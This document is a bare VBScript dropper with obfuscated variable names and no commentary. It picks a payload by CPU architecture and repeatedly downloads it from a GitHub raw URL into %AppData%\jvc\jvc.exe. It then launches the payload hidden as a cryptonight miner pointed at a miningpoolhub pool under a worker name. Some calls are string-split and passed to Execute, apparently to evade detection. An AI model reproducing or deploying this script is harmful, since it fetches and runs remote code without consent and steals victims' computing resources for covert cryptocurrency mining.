UMbty = GetAppDateFolder("jvc")
UMbty = UMbty & "jvc.exe"
Dim FDrtw
Dim FDrte
Set FDrtr=wscript.createobject("wscript.shell")
FDrte=FDrtr.environment("system").item("processor_architecture")
if right(FDrte, 2) = "64" then
FDrtw = "https://raw.githubusercontent.com/jommb/872/master/b"
else
FDrtw = "https://raw.githubusercontent.com/jommb/872/master/m"
end if
Set FDrtt = CreateObject("Scripting.FileSystemObject")
If FDrtt.FileExists(UMbty) Then FDrtt.DeleteFile UMbty
On Error Resume Next
Do
 Err.Clear
 FDrty FDrtw, UMbty
 
 If dir(UMbty) = "" Then WScript.Sleep 10000
 
loop Until FDrtt.FileExists(UMbty)
Set FDrtu = WScript.CreateObject("WScript.Shell")
trv="FDrtu.Run UMbty"
trv=trv&" & "
trv=trv&""" --auto --any --forever --variation 3  --variation 15 --low -o europe.cryptonight-hub.miningpoolhub.com:20580 -u telefile.w -p x"", 0, false"
Execute trv
WScript.Quit
Function FDrty(InetFile, jvc)
	 dim FDrti
	 On Error Resume Next
	 Set FDrti = CreateObject("WinHttp.WinHttpRequest.5.1")
	 Do	
	  FDrto = ""
	  FDrti.Open "GET", InetFile, False
	  FDrti.Send
	  FDrto = FDrti.responseText
	 Loop Until FDrto <> ""
	 set FDrtp = CreateObject("ADODB.Stream")
	 FDrtp.Type = 1
	 FDrtp.Open
	 FDrtp.Write FDrti.responseBody
	 Execute "FDrtp.S"&"aveToFile jvc"
	 FDrtp.Close
	 Set FDrti = Nothing
	
End Function
Function GetAppDateFolder(FolderName)
	Set FDrta = CreateObject("WScript.Shell")
	GetAppDateFolder = FDrta.ExpandEnvironmentStrings("%AppData%\" & FolderName & "\")
	Set fileSystem = CreateObject("Scripting.FileSystemObject")
	If (fileSystem.FolderExists(GetAppDateFolder)) Then
	Else
		fileSystem.CreateFolder GetAppDateFolder
	End If
End Function